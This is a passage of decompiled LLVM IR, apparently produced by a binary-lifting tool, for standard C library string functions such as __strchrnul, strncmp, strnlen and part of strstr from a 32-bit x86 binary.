  %v2_804e69c = load i8, i8* %v1_804e69c, align 1
  %v3_804e69c = load i32, i32* @ebx, align 4
  %v4_804e69c = trunc i32 %v3_804e69c to i8
  %v15_804e69c = icmp eq i8 %v2_804e69c, %v4_804e69c
  %v1_804e69e = icmp eq i1 %v15_804e69c, false
  %v2_804e6a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e6a4, i32* @ebx, align 4
  %v2_804e6a8 = select i1 %v1_804e69e, i32 0, i32 %v4_804e693
  ret i32 %v2_804e6a8
}

define i32 @__strchrnul(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg2 to i8
  %v0_804e6b0 = load i32, i32* @edi, align 4
  %v4_804e6b6 = urem i32 %arg2, 256
  %v4_804e6bb = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e6bb, i32* %ebx.global-to-local, align 4
  %v4_804e6bf = icmp eq i8 %tmp, 0
  br i1 %v4_804e6bf, label %dec_label_pc_804e6f0, label %dec_label_pc_804e6c3

dec_label_pc_804e6c3:                             ; preds = %entry
  %v2_804e6c3 = urem i32 %v4_804e6bb, 4
  %v3_804e6c3 = icmp eq i32 %v2_804e6c3, 0
  %v1_804e6c9 = icmp eq i1 %v3_804e6c3, false
  br i1 %v1_804e6c9, label %dec_label_pc_804e6e2, label %dec_label_pc_804e701

dec_label_pc_804e6d0:                             ; preds = %dec_label_pc_804e6e2
  %v2_804e6d0 = load i8, i8* %v1_804e6e2, align 1
  %v3_804e6d0 = zext i8 %v2_804e6d0 to i32
  %v12_804e6d3 = icmp eq i32 %v3_804e6d0, %v4_804e6b6
  br i1 %v12_804e6d3, label %dec_label_pc_804e6e7, label %dec_label_pc_804e6d7

dec_label_pc_804e6d7:                             ; preds = %dec_label_pc_804e6d0
  %v1_804e6d7 = add i32 %v0_804e6ea, 1
  store i32 %v1_804e6d7, i32* %ebx.global-to-local, align 4
  %v2_804e6da = urem i32 %v1_804e6d7, 4
  %v3_804e6da = icmp eq i32 %v2_804e6da, 0
  br i1 %v3_804e6da, label %dec_label_pc_804e701, label %dec_label_pc_804e6e2

dec_label_pc_804e6e2:                             ; preds = %dec_label_pc_804e6c3, %dec_label_pc_804e6d7
  %v0_804e6ea = phi i32 [ %v1_804e6d7, %dec_label_pc_804e6d7 ], [ %v4_804e6bb, %dec_label_pc_804e6c3 ]
  %v1_804e6e2 = inttoptr i32 %v0_804e6ea to i8*
  %v2_804e6e2 = load i8, i8* %v1_804e6e2, align 1
  %v3_804e6e2 = icmp eq i8 %v2_804e6e2, 0
  %v1_804e6e5 = icmp eq i1 %v3_804e6e2, false
  br i1 %v1_804e6e5, label %dec_label_pc_804e6d0, label %dec_label_pc_804e6e7

dec_label_pc_804e6e7:                             ; preds = %dec_label_pc_804e6d0, %dec_label_pc_804e6e2
  ret i32 %v0_804e6ea

dec_label_pc_804e6f0:                             ; preds = %entry
  %v3_804e6f3 = call i32 @strlen(i8* %arg1)
  %v1_804e6fb = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e6fb = add i32 %v1_804e6fb, %v3_804e6f3
  store i32 %v0_804e6b0, i32* @edi, align 4
  ret i32 %v2_804e6fb

dec_label_pc_804e701:                             ; preds = %dec_label_pc_804e6d7, %dec_label_pc_804e6c3
  %v0_804e701 = phi i32 [ %v4_804e6bb, %dec_label_pc_804e6c3 ], [ %v1_804e6d7, %dec_label_pc_804e6d7 ]
  %v1_804e701 = inttoptr i32 %v0_804e701 to i32*
  %v2_804e701 = load i32, i32* %v1_804e701, align 4
  store i32 %v2_804e701, i32* @ecx, align 4
  %v1_804e705 = add i32 %v2_804e701, -16843009
  %v1_804e70b = sub i32 -1, %v2_804e701
  %v2_804e70d = and i32 %v1_804e705, %v1_804e70b
  %v1_804e70f = and i32 %v2_804e70d, -2139062144
  %v2_804e70f = icmp eq i32 %v1_804e70f, 0
  %v1_804e714 = icmp eq i1 %v2_804e70f, false
  br i1 %v1_804e714, label %dec_label_pc_804e750, label %dec_label_pc_804e716

dec_label_pc_804e716:                             ; preds = %dec_label_pc_804e701
  %v3_804e716 = mul nuw i32 %v4_804e6b6, 16843009
  %v2_804e71e = xor i32 %v2_804e701, %v3_804e716
  %v1_804e73e28 = add i32 %v2_804e71e, -16843009
  %v1_804e74429 = sub i32 -1, %v2_804e71e
  %v2_804e74630 = and i32 %v1_804e74429, -2139062144
  %v1_804e74831 = and i32 %v2_804e74630, %v1_804e73e28
  %v2_804e74832 = icmp eq i32 %v1_804e74831, 0
  br i1 %v2_804e74832, label %dec_label_pc_804e722, label %dec_label_pc_804e750.loopexit

dec_label_pc_804e722:                             ; preds = %dec_label_pc_804e716, %dec_label_pc_804e73a
  %v0_804e72233 = phi i32 [ %v1_804e722, %dec_label_pc_804e73a ], [ %v0_804e701, %dec_label_pc_804e716 ]
  %v1_804e722 = add i32 %v0_804e72233, 4
  store i32 %v1_804e722, i32* %ebx.global-to-local, align 4
  %v1_804e725 = inttoptr i32 %v1_804e722 to i32*
  %v2_804e725 = load i32, i32* %v1_804e725, align 4
  store i32 %v2_804e725, i32* @ecx, align 4
  %v1_804e729 = add i32 %v2_804e725, -16843009
  %v1_804e72f = sub i32 -1, %v2_804e725
  %v2_804e731 = and i32 %v1_804e729, %v1_804e72f
  %v1_804e733 = and i32 %v2_804e731, -2139062144
  %v2_804e733 = icmp eq i32 %v1_804e733, 0
  %v1_804e738 = icmp eq i1 %v2_804e733, false
  br i1 %v1_804e738, label %dec_label_pc_804e750.loopexit, label %dec_label_pc_804e73a

dec_label_pc_804e73a:                             ; preds = %dec_label_pc_804e722
  %v2_804e73c = xor i32 %v2_804e725, %v3_804e716
  %v1_804e73e = add i32 %v2_804e73c, -16843009
  %v1_804e744 = sub i32 -1, %v2_804e73c
  %v2_804e746 = and i32 %v1_804e744, -2139062144
  %v1_804e748 = and i32 %v2_804e746, %v1_804e73e
  %v2_804e748 = icmp eq i32 %v1_804e748, 0
  br i1 %v2_804e748, label %dec_label_pc_804e722, label %dec_label_pc_804e750.loopexit

dec_label_pc_804e750.loopexit:                    ; preds = %dec_label_pc_804e722, %dec_label_pc_804e73a, %dec_label_pc_804e716
  %v0_804e75013 = phi i32 [ %v0_804e701, %dec_label_pc_804e716 ], [ %v1_804e722, %dec_label_pc_804e73a ], [ %v1_804e722, %dec_label_pc_804e722 ]
  br label %dec_label_pc_804e750

dec_label_pc_804e750:                             ; preds = %dec_label_pc_804e750.loopexit, %dec_label_pc_804e701
  %v0_804e753 = phi i32 [ %v0_804e75013, %dec_label_pc_804e750.loopexit ], [ %v0_804e701, %dec_label_pc_804e701 ]
  %v1_804e750 = inttoptr i32 %v0_804e753 to i8*
  %v2_804e750 = load i8, i8* %v1_804e750, align 1
  %v3_804e750 = icmp eq i8 %v2_804e750, 0
  %v1_804e755 = icmp eq i1 %v3_804e750, false
  br i1 %v1_804e755, label %dec_label_pc_804e768, label %dec_label_pc_804e772

dec_label_pc_804e760:                             ; preds = %dec_label_pc_804e768
  %v1_804e760 = add i32 %v0_804e760, 1
  %v1_804e763 = inttoptr i32 %v1_804e760 to i8*
  %v2_804e763 = load i8, i8* %v1_804e763, align 1
  %v3_804e763 = icmp eq i8 %v2_804e763, 0
  br i1 %v3_804e763, label %dec_label_pc_804e772, label %dec_label_pc_804e768

dec_label_pc_804e768:                             ; preds = %dec_label_pc_804e750, %dec_label_pc_804e760
  %v0_804e760 = phi i32 [ %v1_804e760, %dec_label_pc_804e760 ], [ %v0_804e753, %dec_label_pc_804e750 ]
  %v1_804e768 = inttoptr i32 %v0_804e760 to i8*
  %v2_804e768 = load i8, i8* %v1_804e768, align 1
  %v3_804e768 = zext i8 %v2_804e768 to i32
  %v12_804e76b = icmp eq i32 %v3_804e768, %v4_804e6b6
  %v1_804e770 = icmp eq i1 %v12_804e76b, false
  br i1 %v1_804e770, label %dec_label_pc_804e760, label %dec_label_pc_804e772

dec_label_pc_804e772:                             ; preds = %dec_label_pc_804e760, %dec_label_pc_804e768, %dec_label_pc_804e750
  %v0_804e775 = phi i32 [ %v0_804e753, %dec_label_pc_804e750 ], [ %v1_804e760, %dec_label_pc_804e760 ], [ %v0_804e760, %dec_label_pc_804e768 ]
  store i32 %v0_804e6b0, i32* @edi, align 4
  ret i32 %v0_804e775

; uselistorder directives
  uselistorder i32 %v0_804e760, { 0, 2, 1 }
  uselistorder i32 %v0_804e753, { 1, 0, 2 }
  uselistorder i32 %v2_804e725, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804e722, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v3_804e716, { 1, 0 }
  uselistorder i32 %v2_804e701, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e701, { 2, 0, 1, 3 }
  uselistorder i8* %v1_804e6e2, { 1, 0 }
  uselistorder i32 %v0_804e6ea, { 0, 2, 1 }
  uselistorder i32 %v1_804e6d7, { 1, 2, 0, 3 }
  uselistorder i32 %v4_804e6bb, { 2, 1, 0, 3 }
  uselistorder i32 %v4_804e6b6, { 1, 2, 0 }
  uselistorder i32 %v0_804e6b0, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 16843009, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e772, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e768, { 1, 0 }
  uselistorder label %dec_label_pc_804e750.loopexit, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e722, { 1, 0 }
  uselistorder label %dec_label_pc_804e6e7, { 1, 0 }
  uselistorder label %dec_label_pc_804e6e2, { 1, 0 }
}

declare i32 @strcmp(i8*, i8*) local_unnamed_addr

define i32 @strcpy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804e7b0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804e7c3 = inttoptr i32 %arg1 to i8*
  %v4_804e7c3 = call i32 @__stpcpy(i8* %v3_804e7c3, i32 %arg2, i32 %v0_804e7b0)
  %v0_804e7c8 = load i32, i32* @ebx, align 4
  store i32 %v0_804e7b0, i32* @ebx, align 4
  ret i32 %v0_804e7c8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncmp() local_unnamed_addr {
entry:
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp13 = call i8* @__decompiler_undefined_function_1()
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  store i32 0, i32* @edx, align 4
  %v4_804e839 = ptrtoint i8* %tmp13 to i32
  %v1_804e83d = add i32 %tmp14, -1
  %v5_804e83d = icmp eq i32 %tmp14, 0
  %v9_804e83d = icmp eq i32 %v1_804e83d, 0
  br i1 %v5_804e83d, label %dec_label_pc_804e88f, label %dec_label_pc_804e845

dec_label_pc_804e845:                             ; preds = %entry
  %v2_804e845 = load i8, i8* %tmp13, align 1
  %v3_804e845 = zext i8 %v2_804e845 to i32
  %v4_804e848 = ptrtoint i8* %tmp to i32
  %v4_804e84c = icmp eq i8 %v2_804e845, 0
  br i1 %v4_804e84c, label %dec_label_pc_804e895, label %dec_label_pc_804e850

dec_label_pc_804e850:                             ; preds = %dec_label_pc_804e845
  %v2_804e850 = load i8, i8* %tmp, align 1
  %v3_804e850 = zext i8 %v2_804e850 to i32
  %v4_804e853 = icmp eq i8 %v2_804e850, 0
  br i1 %v4_804e853, label %dec_label_pc_804e887, label %dec_label_pc_804e857

dec_label_pc_804e857:                             ; preds = %dec_label_pc_804e850
  br i1 %v9_804e83d, label %dec_label_pc_804e887, label %dec_label_pc_804e85b

dec_label_pc_804e85b:                             ; preds = %dec_label_pc_804e857
  %v15_804e85b = icmp eq i8 %v2_804e845, %v2_804e850
  %v1_804e860 = icmp eq i1 %v15_804e85b, false
  br i1 %v1_804e860, label %dec_label_pc_804e887, label %dec_label_pc_804e862

dec_label_pc_804e862:                             ; preds = %dec_label_pc_804e85b
  br label %dec_label_pc_804e872

dec_label_pc_804e866:                             ; preds = %dec_label_pc_804e87d
  %v9_804e880 = icmp eq i32 %v1_804e880, 0
  br i1 %v9_804e880, label %dec_label_pc_804e887, label %dec_label_pc_804e86a

dec_label_pc_804e86a:                             ; preds = %dec_label_pc_804e866
  %v15_804e86d = icmp eq i8 %v3_804e872, %v2_804e87d
  %v1_804e870 = icmp eq i1 %v15_804e86d, false
  br i1 %v1_804e870, label %dec_label_pc_804e887, label %dec_label_pc_804e872

dec_label_pc_804e872:                             ; preds = %dec_label_pc_804e86a, %dec_label_pc_804e862
  %v0_804e880 = phi i32 [ %v1_804e880, %dec_label_pc_804e86a ], [ %v1_804e83d, %dec_label_pc_804e862 ]
  %v0_804e876 = phi i32 [ %v1_804e876, %dec_label_pc_804e86a ], [ %v4_804e848, %dec_label_pc_804e862 ]
  %v0_804e86a = phi i32 [ %v1_804e872, %dec_label_pc_804e86a ], [ %v4_804e839, %dec_label_pc_804e862 ]
  %v1_804e872 = add i32 %v0_804e86a, 1
  %v2_804e872 = inttoptr i32 %v1_804e872 to i8*
  %v3_804e872 = load i8, i8* %v2_804e872, align 1
  %v4_804e872 = zext i8 %v3_804e872 to i32
  %v1_804e876 = add i32 %v0_804e876, 1
  %v4_804e879 = icmp eq i8 %v3_804e872, 0
  br i1 %v4_804e879, label %dec_label_pc_804e895, label %dec_label_pc_804e87d

dec_label_pc_804e87d:                             ; preds = %dec_label_pc_804e872
  %v1_804e87d = inttoptr i32 %v1_804e876 to i8*
  %v2_804e87d = load i8, i8* %v1_804e87d, align 1
  %v3_804e87d = zext i8 %v2_804e87d to i32
  %v1_804e880 = add i32 %v0_804e880, -1
  %v4_804e883 = icmp eq i8 %v2_804e87d, 0
  %v1_804e885 = icmp eq i1 %v4_804e883, false
  br i1 %v1_804e885, label %dec_label_pc_804e866, label %dec_label_pc_804e887

dec_label_pc_804e887:                             ; preds = %dec_label_pc_804e86a, %dec_label_pc_804e866, %dec_label_pc_804e87d, %dec_label_pc_804e85b, %dec_label_pc_804e857, %dec_label_pc_804e850, %dec_label_pc_804e895
  %v0_804e88a = phi i32 [ %v3_804e850, %dec_label_pc_804e85b ], [ %v3_804e850, %dec_label_pc_804e857 ], [ %v3_804e850, %dec_label_pc_804e850 ], [ %v3_804e895, %dec_label_pc_804e895 ], [ %v3_804e87d, %dec_label_pc_804e87d ], [ %v3_804e87d, %dec_label_pc_804e866 ], [ %v3_804e87d, %dec_label_pc_804e86a ]
  %v0_804e887 = phi i32 [ %v3_804e845, %dec_label_pc_804e85b ], [ %v3_804e845, %dec_label_pc_804e857 ], [ %v3_804e845, %dec_label_pc_804e850 ], [ %v0_804e8878, %dec_label_pc_804e895 ], [ %v4_804e872, %dec_label_pc_804e87d ], [ %v4_804e872, %dec_label_pc_804e866 ], [ %v4_804e872, %dec_label_pc_804e86a ]
  %v1_804e887 = urem i32 %v0_804e887, 256
  %v2_804e88d = sub nsw i32 %v1_804e887, %v0_804e88a
  store i32 %v2_804e88d, i32* @edx, align 4
  br label %dec_label_pc_804e88f

dec_label_pc_804e88f:                             ; preds = %entry, %dec_label_pc_804e887
  %v0_804e890 = phi i32 [ 0, %entry ], [ %v2_804e88d, %dec_label_pc_804e887 ]
  ret i32 %v0_804e890

dec_label_pc_804e895:                             ; preds = %dec_label_pc_804e872, %dec_label_pc_804e845
  %v0_804e8878 = phi i32 [ %v3_804e845, %dec_label_pc_804e845 ], [ %v4_804e872, %dec_label_pc_804e872 ]
  %v0_804e895 = phi i32 [ %v4_804e848, %dec_label_pc_804e845 ], [ %v1_804e876, %dec_label_pc_804e872 ]
  %v1_804e895 = inttoptr i32 %v0_804e895 to i8*
  %v2_804e895 = load i8, i8* %v1_804e895, align 1
  %v3_804e895 = zext i8 %v2_804e895 to i32
  br label %dec_label_pc_804e887

; uselistorder directives
  uselistorder i32 %v1_804e880, { 1, 0 }
  uselistorder i8 %v2_804e87d, { 1, 2, 0 }
  uselistorder i8 %v3_804e872, { 1, 2, 0 }
  uselistorder i32 %v1_804e872, { 1, 0 }
  uselistorder label %dec_label_pc_804e88f, { 1, 0 }
  uselistorder label %dec_label_pc_804e887, { 6, 2, 0, 1, 3, 4, 5 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804e8a0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804e8bb = inttoptr i32 %arg1 to i8*
  %v4_804e8bb = call i32 @__stpncpy(i8* %v3_804e8bb, i32 %arg2, i32 %arg3)
  %v0_804e8c0 = load i32, i32* @ebx, align 4
  store i32 %v0_804e8a0, i32* @ebx, align 4
  ret i32 %v0_804e8c0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @strnlen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804e8d3 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_804e8db = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_804e8f2 = inttoptr i32 %arg1 to i8*
  %v4_804e8f2 = call i32 @memchr(i8* %v3_804e8f2, i32 0, i32 %arg2)
  %v1_804e8f7 = icmp eq i32 %v4_804e8f2, 0
  br i1 %v1_804e8f7, label %entry.dec_label_pc_804e8ff_crit_edge, label %dec_label_pc_804e8fb

entry.dec_label_pc_804e8ff_crit_edge:             ; preds = %entry
  %v0_804e8ff.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e8ff

dec_label_pc_804e8fb:                             ; preds = %entry
  %v1_804e8fd = load i32, i32* @esi, align 4
  %v2_804e8fd = sub i32 %v4_804e8f2, %v1_804e8fd
  br label %dec_label_pc_804e8ff

dec_label_pc_804e8ff:                             ; preds = %entry.dec_label_pc_804e8ff_crit_edge, %dec_label_pc_804e8fb
  %v0_804e8ff = phi i32 [ %v0_804e8ff.pre, %entry.dec_label_pc_804e8ff_crit_edge ], [ %v2_804e8fd, %dec_label_pc_804e8fb ]
  store i32 %v0_804e8db, i32* @esi, align 4
  store i32 %v0_804e8d3, i32* @ebx, align 4
  ret i32 %v0_804e8ff

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e8ff, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v4_804e91d = ptrtoint i8* %arg2 to i32
  store i32 %v4_804e91d, i32* %ebp.global-to-local, align 4
  %v0_804e924 = load i32, i32* @esi, align 4
  %v0_804e932 = load i32, i32* @ebx, align 4
  %v0_804e939 = load i32, i32* @edi, align 4
  %v2_804e940 = load i8, i8* %arg2, align 1
  %v3_804e940 = zext i8 %v2_804e940 to i32
  store i32 %v3_804e940, i32* %eax.global-to-local, align 4
  %v4_804e946 = icmp eq i8 %v2_804e940, 0
  %v1_804e948 = icmp eq i1 %v4_804e946, false
  br i1 %v1_804e948, label %dec_label_pc_804e970, label %dec_label_pc_804e94a

dec_label_pc_804e94a:                             ; preds = %dec_label_pc_804eaf5, %dec_label_pc_804eae5, %dec_label_pc_804ead4, %dec_label_pc_804e985, %dec_label_pc_804e970, %entry, %dec_label_pc_804ee31, %dec_label_pc_804ede8, %dec_label_pc_804eb00, %dec_label_pc_804eacd, %dec_label_pc_804ea4d, %dec_label_pc_804e9dc
  %v0_804e94a = phi i32 [ %v1_804eaf7, %dec_label_pc_804eaf5 ], [ %v1_804eae7, %dec_label_pc_804eae5 ], [ %v1_804ead6, %dec_label_pc_804ead4 ], [ %v3_804e97a, %dec_label_pc_804e985 ], [ 0, %dec_label_pc_804e970 ], [ %arg1, %entry ], [ 0, %dec_label_pc_804ee31 ], [ %v0_804edf0, %dec_label_pc_804ede8 ], [ 0, %dec_label_pc_804eb00 ], [ 0, %dec_label_pc_804eacd ], [ 0, %dec_label_pc_804ea4d ], [ 0, %dec_label_pc_804e9dc ]
  store i32 %v0_804e94a, i32* %eax.global-to-local, align 4
  store i32 %v0_804e932, i32* @ebx, align 4
  store i32 %v0_804e924, i32* @esi, align 4
  store i32 %v0_804e939, i32* @edi, align 4
  ret i32 %v0_804e94a

dec_label_pc_804e970:                             ; preds = %entry
  %v2_804e970 = sext i8 %v2_804e940 to i32
  store i32 %v2_804e970, i32* %eax.global-to-local, align 4
  %v3_804e97a = call i32 @strchr(i32 %arg1, i8 %v2_804e940)
  store i32 %v3_804e97a, i32* %eax.global-to-local, align 4
  %v2_804e97f = icmp eq i32 %v3_804e97a, 0
  store i32 %v3_804e97a, i32* @esi, align 4
  br i1 %v2_804e97f, label %dec_label_pc_804e94a, label %dec_label_pc_804e985

dec_label_pc_804e985:                             ; preds = %dec_label_pc_804e970
  %v0_804e985 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e985 = add i32 %v0_804e985, 1
  %v2_804e985 = inttoptr i32 %v1_804e985 to i8*
  %v3_804e985 = load i8, i8* %v2_804e985, align 1
  %v4_804e985 = icmp eq i8 %v3_804e985, 0
  br i1 %v4_804e985, label %dec_label_pc_804e94a, label %dec_label_pc_804e98b

dec_label_pc_804e98b:                             ; preds = %dec_label_pc_804e985
  %v2_804e98b = add i32 %v3_804e97a, 1
  %v3_804e98b = inttoptr i32 %v2_804e98b to i8*
  %v4_804e98b = load i8, i8* %v3_804e98b, align 1
  %v5_804e98b = icmp eq i8 %v4_804e98b, 0
  br i1 %v5_804e98b, label %dec_label_pc_804e9dc, label %dec_label_pc_804e992

dec_label_pc_804e992:                             ; preds = %dec_label_pc_804e98b
  %v1_804e992 = add i32 %v0_804e985, 2
  %v2_804e992 = inttoptr i32 %v1_804e992 to i8*
  %v3_804e992 = load i8, i8* %v2_804e992, align 1
  %v4_804e992 = icmp eq i8 %v3_804e992, 0
  %v1_804e996 = icmp eq i1 %v4_804e992, false
  br i1 %v1_804e996, label %dec_label_pc_804e9e3, label %dec_label_pc_804e998

dec_label_pc_804e998:                             ; preds = %dec_label_pc_804e992
  %v1_804e998 = inttoptr i32 %v0_804e985 to i8*
  %v2_804e998 = load i8, i8* %v1_804e998, align 1
  %v3_804e998 = zext i8 %v2_804e998 to i32
  store i32 %v3_804e998, i32* %eax.global-to-local, align 4
  store i32 %v2_804e98b, i32* %ebx.global-to-local, align 4
  %v3_804e99f = load i8, i8* %v2_804e985, align 1
  %v3_804e9a3 = load i8, i8* %v3_804e98b, align 1
  %v4_804e9a3 = zext i8 %v3_804e9a3 to i32
  %v2_804e9a7 = mul nuw nsw i32 %v3_804e998, 256
  store i32 %v2_804e9a7, i32* %eax.global-to-local, align 4
  %v1_804e9ac = inttoptr i32 %v3_804e97a to i8*
  %v2_804e9ac = load i8, i8* %v1_804e9ac, align 1
  %v3_804e9ac = zext i8 %v2_804e9ac to i32
  %v2_804e9b2 = mul nuw nsw i32 %v3_804e9ac, 256
  %v2_804e9b5 = or i32 %v2_804e9b2, %v4_804e9a3
  store i32 %v2_804e9b5, i32* @ecx, align 4
  %v4_804e9b7 = icmp eq i8 %v3_804e9a3, 0
  %v1_804e9b9 = icmp eq i1 %v4_804e9b7, false
  %v2_804e9b9 = zext i1 %v1_804e9b9 to i32
  %v5_804e9b9 = or i32 %v2_804e9b2, %v2_804e9b9
  store i32 %v5_804e9b9, i32* %eax.global-to-local, align 4
  br i1 %v4_804e9b7, label %dec_label_pc_804e9dc, label %dec_label_pc_804e9be.preheader

dec_label_pc_804e9be.preheader:                   ; preds = %dec_label_pc_804e998
  %v4_804e99f = zext i8 %v3_804e99f to i32
  %v2_804e9aa = or i32 %v4_804e99f, %v2_804e9a7
  %v1_804e9be = trunc i32 %v2_804e9aa to i16
  br label %dec_label_pc_804e9be

dec_label_pc_804e9be:                             ; preds = %dec_label_pc_804e9be.preheader, %dec_label_pc_804e9c7
  %v0_804ead4 = phi i32 [ %v2_804e9d7, %dec_label_pc_804e9c7 ], [ %v5_804e9b9, %dec_label_pc_804e9be.preheader ]
  %v0_804ead6 = phi i32 [ %v1_804e9c7, %dec_label_pc_804e9c7 ], [ %v2_804e98b, %dec_label_pc_804e9be.preheader ]
  %v0_804e9cd = phi i32 [ %v2_804e9d3, %dec_label_pc_804e9c7 ], [ %v2_804e9b5, %dec_label_pc_804e9be.preheader ]
  %v3_804e9be = trunc i32 %v0_804e9cd to i16
  %v15_804e9be = icmp eq i16 %v1_804e9be, %v3_804e9be
  br i1 %v15_804e9be, label %dec_label_pc_804ead4, label %dec_label_pc_804e9c7

dec_label_pc_804e9c7:                             ; preds = %dec_label_pc_804e9be
  %v1_804e9c7 = add i32 %v0_804ead6, 1
  store i32 %v1_804e9c7, i32* %ebx.global-to-local, align 4
  %v1_804e9ca = inttoptr i32 %v1_804e9c7 to i8*
  %v2_804e9ca = load i8, i8* %v1_804e9ca, align 1
  %v3_804e9ca = zext i8 %v2_804e9ca to i32
  %v2_804e9cd = mul i32 %v0_804e9cd, 256
  %v2_804e9d3 = or i32 %v3_804e9ca, %v2_804e9cd
  store i32 %v2_804e9d3, i32* @ecx, align 4
  %v4_804e9d5 = icmp eq i8 %v2_804e9ca, 0
  %v1_804e9d7 = icmp eq i1 %v4_804e9d5, false
  %v2_804e9d7 = zext i1 %v1_804e9d7 to i32
  store i32 %v2_804e9d7, i32* %eax.global-to-local, align 4
  br i1 %v1_804e9d7, label %dec_label_pc_804e9be, label %dec_label_pc_804e9dc

dec_label_pc_804e9dc:                             ; preds = %dec_label_pc_804e9c7, %dec_label_pc_804eb40, %dec_label_pc_804eb34, %dec_label_pc_804eae5, %dec_label_pc_804ead4, %dec_label_pc_804ea66, %dec_label_pc_804ea54, %dec_label_pc_804e9f2, %dec_label_pc_804e9e3, %dec_label_pc_804e998, %dec_label_pc_804e98b
  br label %dec_label_pc_804e94a

dec_label_pc_804e9e3:                             ; preds = %dec_label_pc_804e992
  %v2_804e9e3 = add i32 %v3_804e97a, 2
  %v3_804e9e3 = inttoptr i32 %v2_804e9e3 to i8*
  %v4_804e9e3 = load i8, i8* %v3_804e9e3, align 1
  %v5_804e9e3 = icmp eq i8 %v4_804e9e3, 0
  br i1 %v5_804e9e3, label %dec_label_pc_804e9dc, label %dec_label_pc_804e9e9

dec_label_pc_804e9e9:                             ; preds = %dec_label_pc_804e9e3
  %v1_804e9e9 = add i32 %v0_804e985, 3
  %v2_804e9e9 = inttoptr i32 %v1_804e9e9 to i8*
  %v3_804e9e9 = load i8, i8* %v2_804e9e9, align 1
  %v4_804e9e9 = icmp eq i8 %v3_804e9e9, 0
  %v1_804e9f0 = icmp eq i1 %v4_804e9e9, false
  br i1 %v1_804e9f0, label %dec_label_pc_804ea54, label %dec_label_pc_804e9f2

dec_label_pc_804e9f2:                             ; preds = %dec_label_pc_804e9e9
  %v3_804e9f2 = load i8, i8* %v2_804e985, align 1
  %v4_804e9f2 = zext i8 %v3_804e9f2 to i32
  store i32 %v2_804e9e3, i32* %ebx.global-to-local, align 4
  %v3_804e9f9 = load i8, i8* %v2_804e992, align 1
  %v4_804e9f9 = zext i8 %v3_804e9f9 to i32
  store i32 %v4_804e9f9, i32* %eax.global-to-local, align 4
  %v3_804e9fd = load i8, i8* %v3_804e9e3, align 1
  %v4_804e9fd = zext i8 %v3_804e9fd to i32
  %v3_804ea01 = load i8, i8* %v3_804e98b, align 1
  %v4_804ea01 = zext i8 %v3_804ea01 to i32
  %v2_804ea05 = mul nuw nsw i32 %v4_804e9f2, 65536
  %v2_804ea08 = mul nuw nsw i32 %v4_804e9f9, 256
  store i32 %v2_804ea08, i32* %eax.global-to-local, align 4
  %v2_804ea0b = or i32 %v2_804ea08, %v2_804ea05
  %v1_804ea0d = inttoptr i32 %v0_804e985 to i8*
  %v2_804ea0d = load i8, i8* %v1_804ea0d, align 1
  %v3_804ea0d = zext i8 %v2_804ea0d to i32
  %v2_804ea11 = mul nuw nsw i32 %v4_804ea01, 65536
  %v2_804ea14 = mul nuw i32 %v3_804ea0d, 16777216
  %v2_804ea17 = or i32 %v2_804ea14, %v2_804ea0b
  %v2_804ea1c = mul nuw nsw i32 %v4_804e9fd, 256
  store i32 %v2_804ea1c, i32* %eax.global-to-local, align 4
  %v2_804ea1f = or i32 %v2_804ea11, %v2_804ea1c
  %v1_804ea21 = inttoptr i32 %v3_804e97a to i8*
  %v2_804ea21 = load i8, i8* %v1_804ea21, align 1
  %v3_804ea21 = zext i8 %v2_804ea21 to i32
  %v2_804ea24 = mul nuw i32 %v3_804ea21, 16777216
  %v2_804ea27 = or i32 %v2_804ea24, %v2_804ea1f
  store i32 %v2_804ea27, i32* @ecx, align 4
  %v4_804ea29 = icmp eq i8 %v3_804e9fd, 0
  %v1_804ea2b = icmp eq i1 %v4_804ea29, false
  %v2_804ea2b = zext i1 %v1_804ea2b to i32
  %v5_804ea2b = or i32 %v2_804ea24, %v2_804ea2b
  store i32 %v5_804ea2b, i32* %eax.global-to-local, align 4
  br i1 %v4_804ea29, label %dec_label_pc_804e9dc, label %dec_label_pc_804ea30

dec_label_pc_804ea30:                             ; preds = %dec_label_pc_804e9f2, %dec_label_pc_804ea38
  %v0_804eae7 = phi i32 [ %v1_804ea38, %dec_label_pc_804ea38 ], [ %v2_804e9e3, %dec_label_pc_804e9f2 ]
  %v0_804eae5 = phi i32 [ %v2_804ea48, %dec_label_pc_804ea38 ], [ %v5_804ea2b, %dec_label_pc_804e9f2 ]
